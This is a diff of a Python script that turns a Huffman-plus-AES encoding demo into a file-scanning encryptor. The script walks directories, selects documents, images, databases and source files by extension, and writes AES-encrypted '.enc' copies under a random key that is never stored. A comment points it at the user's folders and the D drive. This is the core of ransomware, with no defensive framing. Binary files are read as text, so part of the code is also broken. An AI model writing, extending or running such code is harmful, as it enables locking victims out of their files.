@@ -1,111 +1,118 @@
+import os
+import fnmatch
 import heapq
-from collections import Counter
+import json
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad, unpad
 from Crypto.Random import get_random_bytes
-from Crypto.PublicKey import RSA
-from Crypto.Cipher import PKCS1_OAEP
 
-# 霍夫曼編碼和解碼
+# 霍夫曼編碼相關類和函數
 class HuffmanNode:
-    def __init__(self, freq, symbol=None, left=None, right=None):
+    def __init__(self, freq, char=None, left=None, right=None):
         self.freq = freq
-        self.symbol = symbol
+        self.char = char
         self.left = left
         self.right = right
 
     def __lt__(self, other):
         return self.freq < other.freq
 
-def build_huffman_tree(text):
-    frequency = Counter(text)
-    heap = [HuffmanNode(freq, symbol) for symbol, freq in frequency.items()]
+def build_huffman_tree(frequencies):
+    if not frequencies:
+        raise ValueError("The frequency dictionary is empty, cannot build Huffman Tree.")
+    heap = [HuffmanNode(freq, char) for char, freq in frequencies.items()]
     heapq.heapify(heap)
-    
+
     while len(heap) > 1:
         left = heapq.heappop(heap)
         right = heapq.heappop(heap)
         merged = HuffmanNode(left.freq + right.freq, left=left, right=right)
         heapq.heappush(heap, merged)
-    
+
     return heap[0]
 
-def build_codes(node, prefix="", codebook={}):
-    if node.symbol is not None:
-        codebook[node.symbol] = prefix
+def generate_huffman_codes(node, prefix="", codebook={}):
+    if node.char is not None:
+        codebook[node.char] = prefix
     else:
-        build_codes(node.left, prefix + "0", codebook)
-        build_codes(node.right, prefix + "1", codebook)
+        generate_huffman_codes(node.left, prefix + "0", codebook)
+        generate_huffman_codes(node.right, prefix + "1", codebook)
     return codebook
 
-def huffman_encode(text):
-    tree = build_huffman_tree(text)
-    codebook = build_codes(tree)
-    encoded_text = ''.join(codebook[symbol] for symbol in text)
-    return encoded_text, tree
+def huffman_encode(data):
+    if not data:
+        raise ValueError("The input data for Huffman encoding is empty.")
+    frequencies = {}
+    for char in data:
+        frequencies[char] = frequencies.get(char, 0) + 1
 
-def huffman_decode(encoded_text, tree):
-    decoded_text = []
-    node = tree
-    for bit in encoded_text:
-        node = node.left if bit == '0' else node.right
-        if node.symbol is not None:
-            decoded_text.append(node.symbol)
-            node = tree
-    return ''.join(decoded_text)
+    huffman_tree = build_huffman_tree(frequencies)
+    huffman_codes = generate_huffman_codes(huffman_tree)
 
-# AES加密和解密
+    encoded_data = ''.join(huffman_codes[char] for char in data)
+    return encoded_data, huffman_codes
+
+def huffman_decode(encoded_data, huffman_codes):
+    reverse_codebook = {v: k for k, v in huffman_codes.items()}
+    current_code = ""
+    decoded_data = []
+
+    for bit in encoded_data:
+        current_code += bit
+        if current_code in reverse_codebook:
+            decoded_data.append(reverse_codebook[current_code])
+            current_code = ""
+
+    return ''.join(decoded_data)
+
+# AES加密相關函數
 def aes_encrypt(data, key):
     cipher = AES.new(key, AES.MODE_CBC)
-    ct_bytes = cipher.encrypt(pad(data.encode(), AES.block_size))
-    iv = cipher.iv
-    return iv + ct_bytes
+    ct_bytes = cipher.encrypt(pad(data.encode('utf-8'), AES.block_size))
+    return cipher.iv + ct_bytes
 
-def aes_decrypt(ciphertext, key):
-    iv = ciphertext[:16]
-    ct = ciphertext[16:]
+def aes_decrypt(enc_data, key):
+    iv = enc_data[:AES.block_size]
+    ct = enc_data[AES.block_size:]
     cipher = AES.new(key, AES.MODE_CBC, iv)
     pt = unpad(cipher.decrypt(ct), AES.block_size)
-    return pt.decode()
+    return pt.decode('utf-8')
 
-# RSA加密和解密
-def rsa_encrypt(data, public_key):
-    cipher = PKCS1_OAEP.new(public_key)
-    return cipher.encrypt(data)
+# 掃描和加密文件
+def scan_and_encrypt(root_path, patterns, key):
+    for root, _, files in os.walk(root_path):
+        for pattern in patterns:
+            for filename in fnmatch.filter(files, pattern):
+                file_path = os.path.join(root, filename)
+                try:
+                    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
+                        file_data = f.read()
 
-def rsa_decrypt(ciphertext, private_key):
-    cipher = PKCS1_OAEP.new(private_key)
-    return cipher.decrypt(ciphertext)
+                    if not file_data:
+                        print(f"File {file_path} is empty, skipping.")
+                        continue
 
-# 示例使用
-text = "this is an example for huffman encoding and AES encryption"
-key = get_random_bytes(16)  # AES-128
+                    # 霍夫曼編碼
+                    encoded_data, huffman_codes = huffman_encode(file_data)
+                    encoded_data_json = json.dumps({"encoded_data": encoded_data, "codes": huffman_codes})
 
-# 生成RSA密鑰對
-rsa_key = RSA.generate(2048)
-private_key = rsa_key
-public_key = rsa_key.publickey()
+                    # AES加密
+                    encrypted_data = aes_encrypt(encoded_data_json, key)
 
-# 霍夫曼編碼
-encoded_text, tree = huffman_encode(text)
+                    # 保存加密文件
+                    with open(file_path + '.enc', 'wb') as ef:
+                        ef.write(encrypted_data)
+                    
+                    print(f"File {file_path} encrypted successfully.")
+                except Exception as e:
+                    print(f"Error processing file {file_path}: {e}")
 
-# AES加密
-encrypted_text = aes_encrypt(encoded_text, key)
+if __name__ == "__main__":
+    key = get_random_bytes(16)  # AES-128
+    root_paths = ["E:\\test"]  # 假設當前登入者的資料夾路徑和D槽
+    patterns = ['*.xlsx', '*.docx', '*.pptx', '*.jpeg', '*.png', '*.gif', '*.sql', '*.ai', '*.cpp', '*.c', '*.java', '*.py', '*.html', '*.js']
 
-# RSA加密AES密鑰
-encrypted_key = rsa_encrypt(key, public_key)
+    for path in root_paths:
+        scan_and_encrypt(path, patterns, key)
 
-# RSA解密AES密鑰
-decrypted_key = rsa_decrypt(encrypted_key, private_key)
-
-# AES解密
-decrypted_encoded_text = aes_decrypt(encrypted_text, decrypted_key)
-
-# 霍夫曼解碼
-decoded_text = huffman_decode(decrypted_encoded_text, tree)
-
-assert text == decoded_text
-print("原文: ", text)
-print("加密後: ", encrypted_text)
-print("RSA加密的AES密鑰: ", encrypted_key)
-print("解密後: ", decoded_text)
+    print("加密完成！")
